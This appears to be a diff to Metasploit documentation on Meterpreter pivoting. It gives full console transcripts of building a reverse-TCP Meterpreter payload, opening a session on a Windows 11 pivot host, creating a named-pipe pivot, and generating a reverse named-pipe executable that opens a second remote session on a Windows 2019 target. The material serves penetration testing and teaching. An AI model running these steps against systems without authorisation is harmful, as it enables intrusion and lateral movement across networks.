@@ -222,28 +222,66 @@ The Windows Meterpreter payload supports lateral movement in a network through S
 First open a Windows Meterpreter session to the pivot machine:
 
 ```
-use exploit/windows/smb/psexec
-run smb://admin:password123@169.254.16.221
+msf6 > use payload/windows/x64/meterpreter/reverse_tcp
+smsf6 payload(windows/x64/meterpreter/reverse_tcp) > set lhost 172.19.182.171
+lhost => 172.19.182.171
+msf6 payload(windows/x64/meterpreter/reverse_tcp) > set lport 4578
+lport => 4578
+msf6 payload(windows/x64/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 0
+
+[*] Started reverse TCP handler on 172.19.182.171:4578 
+msf6 payload(windows/x64/meterpreter/reverse_tcp) > [*] Sending stage (200774 bytes) to 172.19.185.34
+[*] Meterpreter session 1 opened (172.19.182.171:4578 -> 172.19.185.34:49674) at 2022-06-09 13:23:03 -0500
 ```
 
 Create named pipe pivot listener on the pivot machine, setting `-l` to the pivot's bind address:
 
 ```
-meterpreter > pivot add -t pipe -l 169.254.16.221 -n msfpipe -a x64 -p windows
+msf6 payload(windows/x64/meterpreter/reverse_tcp) > sessions -i -1
+[*] Starting interaction with 1...
+
+meterpreter > pivot add -t pipe -l 169.254.16.221 -n msf-pipe -a x64 -p windows
 [+] Successfully created pipe pivot.
-meterpreter >
+meterpreter > background
+[*] Backgrounding session 1...
 ```
 
-Now generate a separate payload that will connect back through the pivot machine. This payload will be executed on the final target machine:
+Now generate a separate payload that will connect back through the pivot machine. This payload will be executed on the final target machine.  Note there is no need to start a handler for the named pipe payload.
 
 ```
-msf6 > use windows/x64/meterpreter/reverse_named_pipe
-msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > generate -o named_pipe_example.exe -f exe pipehost=169.254.16.221 pipename=msfpipe
-[*] Writing 7168 bytes to named_pipe_example.exe...
+msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > show options
+
+Module options (payload/windows/x64/meterpreter/reverse_named_pipe):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   PIPEHOST  .                yes       Host of the pipe to connect to
+   PIPENAME  msf-pipe         yes       Name of the pipe to listen on
+
+msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > set pipehost 169.254.16.221
+pipehost => 169.254.16.221
+msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > generate -f exe -o revpipe_meterpreter_msfpipe.exe
+[*] Writing 7168 bytes to revpipe_meterpreter_msfpipe.exe...
 ```
 
-After running the payload on the final Windows 2019 target machine a new session will open, via the Windows 11 169.254.16.221 pivot.
+After running the payload on the final target machine a new session will open, via the Windows 11 169.254.16.221 pivot.
+```
+msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > [*] Meterpreter session 2 opened (Pivot via [172.19.182.171:4578 -> 169.254.16.221:49674]) at 2022-06-09 13:34:32 -0500
 
+msf6 payload(windows/x64/meterpreter/reverse_named_pipe) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                Connection
+  --  ----  ----                     -----------                                ----------
+  1         meterpreter x64/windows  WIN11\msfuser @ WIN11          172.19.182.171:4578 -> 172.19.185.34:49674 (172.19.185.34)
+  2         meterpreter x64/windows  WIN2019\msfuser @ WIN2019      Pivot via [172.19.182.171:4578 -> 172.19.185.34:49674]
+                                                                                 (169.254.204.110)
+
+```
 ## Pivoting External Tools
 
 ### portfwd
